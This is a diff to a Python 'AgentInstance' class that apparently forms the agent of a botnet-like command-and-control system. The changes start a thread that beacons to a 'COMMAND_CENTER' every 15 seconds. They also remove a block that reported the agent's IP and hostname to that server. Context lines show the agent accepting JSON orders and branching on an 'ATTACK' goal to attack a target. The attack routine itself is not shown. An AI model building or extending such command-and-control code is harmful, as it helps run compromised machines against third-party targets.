@@ -55,6 +55,16 @@ class AgentInstance:
             # Register the agent
             self.register_agent()
 
+            # Determine if the agent should be heartbeating
+            if self.UNREGISTERED is False and self.should_heartbeat is False:
+                # Start the heartbeat thread
+                print("Starting Heartbeat thread to prove health status")
+                self.should_heartbeat = True
+                self.heartbeat_thread.start()
+            elif self.UNREGISTERED is True and self.should_heartbeat is True:
+                self.should_heartbeat = False
+                self.heartbeat_thread.stop()
+
             # Accept incoming connections
             connection, addr = sock.accept()
 
@@ -62,8 +72,11 @@ class AgentInstance:
             data = connection.recv(1024).decode()
             data = json.loads(data)
 
+            
+
             try:
                 while True:
+                    # If data is being sent to the agent follow this logic chain
                     if data:
 
                         # # Register the command centrum
@@ -82,6 +95,8 @@ class AgentInstance:
                         #     except Exception as e:
                         #         print("Command center could not register: ", e)
                         #     break
+
+            
 
                         # Attack the target
                         if data['GOAL'] == "ATTACK" and self.COMMAND_CENTER:
@@ -166,22 +181,6 @@ class AgentInstance:
 
     # Send HeartBeats to the command center to prove their Health Status | ALWAYS RUN ON A SEPERATE THREAD!
     def send_heartbeat(self):
-
-        # Let the command center know the registration was succesful
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            try:
-                # Send data to Command Center to confirm successful registration, add the IP of the agent for database registration
-                success_message = json.dumps({"REGISTRATION": {"AGENT_IP": f"{self.LOCAL_IP}", "HOSTNAME": f"{self.HOST}"}})
-                # Connect to the command center and send the success message to confirm registration
-                s.connect((self.COMMAND_CENTER, 9191))
-                s.sendall(success_message.encode())
-                # close the connection
-                s.close()
-            except Exception as e:
-                print("\033[1;31mERROR: Failed to send registration confirmation to Command Center: ", e)
-                self.should_heartbeat = False
-                self.heartbeat_thread.join()
-
         # Start the heartbeat
         while self.should_heartbeat:
             try:
@@ -193,10 +192,14 @@ class AgentInstance:
                     s.sendall(heartbeat_message.encode())
                     # close the connection
                     s.close()
-                    print("Beat!")
-                    time.sleep(30)
+                    # Print the heartbeat message with the current time
+                    print(f"\033[1;32mHeartbeat sent to Command Center @ {time.ctime()}")
+                    time.sleep(15)
             except Exception as e:
-                print(f"\033[1;31mERROR: Failed to send HeartBeat to {self.COMMAND_CENTER}: ", e)
-                self.heartbeat_thread.join()
+                print(f"\033[1;31mERROR: Failed to send Heartbeat to {self.COMMAND_CENTER}: ", e)
+                try:
+                    self.heartbeat_thread.join()
+                except Exception as e:
+                    print("\033[1;31mERROR: Could not stop heartbeat thread, it might be wise to reboot the agent: ", e)
 
-        print("\033[1;95mWARNING: HeartBeat stopped!")
+        print("\033[1;95mWARNING: Heartbeat stopped!")
